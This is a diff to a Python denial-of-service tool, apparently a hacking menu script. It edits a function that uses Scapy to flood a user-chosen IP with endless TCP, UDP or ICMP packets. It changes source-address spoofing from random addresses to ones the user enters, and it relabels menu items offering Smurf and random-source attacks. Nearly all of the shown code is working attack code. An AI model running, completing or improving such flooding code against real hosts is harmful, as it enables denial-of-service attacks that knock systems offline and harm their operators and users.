@@ -50,13 +50,17 @@ def DDOSmainF():
                 except KeyboardInterrupt:
                     pass
             elif selection=="2":
-                print(f"\n{system('clear')}\n{randomColorF()}1. TCP\n2. UDP\n3. ICMP\n\n")
+                system('clear')
+                print(f"\n\n{randomColorF()}1. TCP\n2. UDP\n3. ICMP\n\n")
                 selection2=input(f"{randomColorF()}[DDoS]~> ")
                 Dst=input("\n\nEnter the packet destination IP : ")
+                Src=input("\nEnter the packet source IP :")
+                
                 if selection2=="1" or selection2=="2":
                     while 1:
                         try:
                             Dport=int(input("\n\nEnter the packet destination port : "))
+                            Sport=int(input("\n\nEnter the packet source port : "))
                             break
                         except ValueError:
                             print(f"\n\n{color.LIGHTRED_EX}\nValueError !{randomColorF()}")
@@ -64,7 +68,7 @@ def DDOSmainF():
                     print("\n\nEnter ^C to exit .\n\n")
                     try:
                         while 1:
-                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/TCP(sport=randint(1024 ,49151), dport=Dport)
+                            packet = IP(dst=Dst, src=Src)/TCP(sport=Sport, dport=Dport)
                             send(packet)
                     except KeyboardInterrupt:
                         pass
@@ -72,19 +76,20 @@ def DDOSmainF():
                     print("\n\nEnter ^C to exit .\n\n")
                     try:
                         while 1:
-                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/UDP(sport=randint(4096,65535), dport=Dport)
+                            packet = IP(dst=Dst, src=Src)/UDP(sport=Sport, dport=Dport)
                             send(packet)
                     except KeyboardInterrupt:
                         pass
                 elif selection2=="3":
                     try:
                         while 1:
-                            packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/ICMP()
+                            packet = IP(dst=Dst, src=Src)/ICMP()
                             send(packet)
                     except KeyboardInterrupt:
                         pass
             elif selection=="3":
-                print(f"{system('clear')}{randomColorF()}1. Normal attack\n\n2. Smurf attack\n\n")
+                system('clear')
+                print(f"{randomColorF()}1. Normal attack\n\n2. Smurf attack\n\n")
                 selection2=input(f"{randomColorF()}[DDoS]~> ")
                 Dst=input("\n\nEnter the packet destination IP : ")
                 while 1:
@@ -117,7 +122,7 @@ def DDOSmainF():
                     except KeyboardInterrupt:
                         pass
             elif selection=="4":
-                print(f"{system('clear')}{randomColorF()}1. Normal attack\n\n2. Smurf attack\n\n")
+                print(f"{system('clear')}{randomColorF()}1. Normal attack\n\n2. Random src attack\n\n")
                 selection2=input(f"{randomColorF()}[DDoS]~> ")
                 Dst=input("\n\nEnter the packet destination IP : ")
                 if selection2=="1":
